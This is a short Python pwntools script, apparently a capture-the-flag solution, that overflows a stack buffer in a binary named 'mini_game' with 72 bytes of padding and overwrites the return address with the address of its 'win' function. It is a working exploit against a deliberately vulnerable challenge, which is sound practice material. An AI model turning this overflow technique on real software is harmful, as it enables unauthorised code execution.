from pwn import *

context.binary=elf=ELF("./mini_game")
#p=remote("offsec.m0lecon.it",13541)
p=process(elf.path)
offset=64+8

ret=ROP(elf).find_gadget(['ret'])[0]

p.recvuntil(b"go?")

payload=flat(
    b'b'*offset,
    p64(elf.sym.win)

)
#gdb.attach(p)
p.sendline(payload)
print(p.recv())
p.interactive()
